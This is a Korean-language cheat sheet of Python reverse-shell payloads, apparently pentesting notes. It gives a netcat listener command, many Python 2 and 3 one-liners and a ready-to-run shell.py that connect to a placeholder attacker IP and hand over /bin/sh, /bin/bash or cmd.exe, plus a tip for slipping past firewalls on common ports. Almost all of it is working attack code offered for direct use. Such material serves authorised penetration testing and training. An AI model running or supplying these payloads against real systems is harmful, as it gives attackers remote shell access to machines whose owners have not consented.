# python

# 리버스쉘 — Python

---

## 리스너

```bash
nc -lvnp 4444
rlwrap nc -lvnp 4444
```

---

## Python3

```bash
# subprocess 방식 (기본)
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<칼리IP>",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'

# PTY 방식 (더 안정적, TTY 업그레이드 불필요)
python3 -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<칼리IP>",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")'

# os.system 방식
python3 -c 'import os,socket;s=socket.socket();s.connect(("<칼리IP>",4444));[os.dup2(s.fileno(),f) for f in (0,1,2)];os.system("/bin/sh")'

# threading 방식 (더 안정적인 연결 유지)
python3 -c '
import socket,threading,subprocess
s=socket.socket()
s.connect(("<칼리IP>",4444))
p=subprocess.Popen(["/bin/sh","-i"],stdin=s,stdout=s,stderr=s)
p.wait()
'
```

---

## Python2

```bash
# 기본
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<칼리IP>",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

# PTY 방식
python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<칼리IP>",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'
```

---

## 파일로 저장해서 실행 (스크립트 형태)

```python
#!/usr/bin/env python3
# shell.py — IP와 PORT만 수정하면 바로 사용
import socket, subprocess, os, pty

IP = "<칼리IP>"
PORT = 4444

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((IP, PORT))
os.dup2(s.fileno(), 0)
os.dup2(s.fileno(), 1)
os.dup2(s.fileno(), 2)
pty.spawn("/bin/bash")
```

```bash
python3 shell.py
# 또는
chmod +x shell.py && ./shell.py
```

---

## Windows에서 Python 리버스쉘

```bash
python -c "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('<칼리IP>',4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(['cmd.exe'])"

# PowerShell 통해 실행
python.exe -c "import socket,subprocess,os;s=socket.socket();s.connect(('<칼리IP>',4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(['cmd.exe'])"
```

---

## 버전 확인 및 경로

```bash
which python python3 python2
python --version
python3 --version
ls /usr/bin/python* 2>/dev/null
```

---

## 팁

- `python3`이 없으면 `python`, `python2` 순으로 시도
- PTY 방식은 TTY 업그레이드 없이도 sudo 등 사용 가능
- 방화벽 우회 시 포트 443, 80, 8080 사용
- `/usr/bin/env python3` 이 없을 때 `/usr/bin/python3` 직접 지정